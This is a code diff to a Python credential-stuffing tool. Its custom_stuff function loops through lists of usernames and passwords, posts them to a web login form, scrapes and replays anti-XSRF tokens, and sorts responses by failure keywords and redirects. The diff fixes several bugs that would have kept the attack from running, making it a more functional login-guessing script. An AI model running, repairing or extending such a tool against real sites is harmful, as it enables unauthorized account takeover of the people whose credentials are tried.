@@ -123,15 +123,17 @@ def stuff(credentials, numloops, outfile, base_url, wait, verbose, more_verbose,
 
 	return
 
-def custom_stuff(credentials, numloops, outfile, base_url, wait, verbose, more_verbose, debug, password_param, username_param, xsrf_param, succcess_code, success_keyword):
+def custom_stuff(credentials, numloops, outfile, base_url, wait, verbose, more_verbose, debug, password_param, username_param, xsrf_param, success_code, success_keyword):
+
+
 
 	count = 0
 	#If the user indicated there's an anti-xsrf token, see if we can successfully extract it
 	if xsrf_param is not None:
 		print(f' ### Attempting to extract anti-xsrf token using parameter "{xsrf_param}"')
 		r = requests.get(base_url)
-		soup = BeautifulSoup(response.content, 'html.parser')
-		soup.find_all(attrs={"name":xsrf_param})
+		soup = BeautifulSoup(r.content, 'html.parser')
+		xsrf = soup.find_all(attrs={"name":xsrf_param})
 		xsrf_regex = r'^.*value="([a-zA-Z0-9]*)"'
 		m = re.search(xsrf_regex, xsrf[0].prettify())
 		print(f' ### Found line: {xsrf[0].prettify()}')
@@ -139,9 +141,9 @@ def custom_stuff(credentials, numloops, outfile, base_url, wait, verbose, more_v
 		while True:
 			#have the user confirm we extracted the token
 			found_xsrf = input(' Is this the anti-xsrf token (Y/n/q) > ')
-			if found.xsrf.lower() == 'y':
-				continue
-			elif found.xsrf.lower() == 'q':
+			if found_xsrf.lower() == 'y' or found_xsrf == '':
+				break
+			elif found_xsrf.lower() == 'q':
 				print(' ### Aborting ')
 				return
 
@@ -159,15 +161,25 @@ def custom_stuff(credentials, numloops, outfile, base_url, wait, verbose, more_v
 		#end while True:
 	#end if xsrf_param is not None:
 
+	#set up a header line in our output file if the user gave no success condition
+	outfile.write('username, password, response-length, status code, redirect url, "denied", "failed", "invalid", "unauthorized", "not allowed", "not authorized", "not permitted"')
 	
 	while count < numloops:
 		passwords_remaining = False
 		for user in credentials.keys():
+			if debug:
+				print(f' username: {user} data: {credentials[user]}')
+				print(f' {credentials[user][0]} ')
+				print(f' {credentials[user][1]} ')
+				print(f' {len(credentials[user][1])} ')
+				print(f' {credentials[user][1][0]} ')
+	
 			#simpler checks here than the MS/Azure version
 			#The only things we know are the number of passwords to try with this
 			#account and (maybe) whether we've already found a password for this
 			#account
-			if len(credentials([user][1])) > count and credentaisl[user][0] == True:
+
+			if len(credentials[user][1]) > count and credentials[user][0] == True:
 				if debug:
 					print(f'### user: {user} num-creds: {len(credentials[user][1])} count: {count}')
 				if len(credentials[user][1]) > count + 1:
@@ -180,14 +192,14 @@ def custom_stuff(credentials, numloops, outfile, base_url, wait, verbose, more_v
 				# pull an anti-xsrf token, if necessary
 				if xsrf_param is not None:
 					r = requests.get(base_url)
-					soup = BeautifulSoup(response.content, 'html.parser')
-					soup.find_all(attrs={"name":xsrf_param})
+					soup = BeautifulSoup(r.content, 'html.parser')
+					xsrf = soup.find_all(attrs={"name":xsrf_param})
 					m = re.search(xsrf_regex, xsrf[0].prettify())
 					xsrf_token = m.group(1)
 					payload = {username_param: user, password_param: credentials[user][1][count], xsrf_param: xsrf_token}
 				else:
 					payload = {username_param: user, password_param: credentials[user][1][count]}
-				r = requests.post(target_url, data=payload)
+				r = requests.post(base_url, data=payload)
 				
 				#if the user either gave us a HTTP response code indicating success
 				# or some sort of keyword indicating success, we check for it, and 
@@ -220,25 +232,25 @@ def custom_stuff(credentials, numloops, outfile, base_url, wait, verbose, more_v
 				denied = False
 				failed = False
 				invalid = False
-				unauthorize = False
+				unauthorized = False
 				not_allowed = False
 				not_authorized = False
 				not_permitted = False
 				redirect_url = ''
 
-				if 'denied' in r.content.lower():
+				if 'denied' in r.text.lower():
 					denied = True
-				if 'failed' in r.content.lower(): 
+				if 'failed' in r.text.lower(): 
 					failed = True
-				if 'invalid' in r.content.lower():
+				if 'invalid' in r.text.lower():
 					invalid = True
-				if 'unauthorized' in r.content.lower():
+				if 'unauthorized' in r.text.lower():
 					unauthorized = True
-				if 'not allowed' in r.content.lower():
+				if 'not allowed' in r.text.lower():
 					not_allowed = True
-				if 'not authorized' in r.content.lower():
+				if 'not authorized' in r.text.lower():
 					not_authorized = True
-				if 'not permitted' in r.content.lower():
+				if 'not permitted' in r.text.lower():
 					not_permitted = True
 
 				if r.status_code == 302:
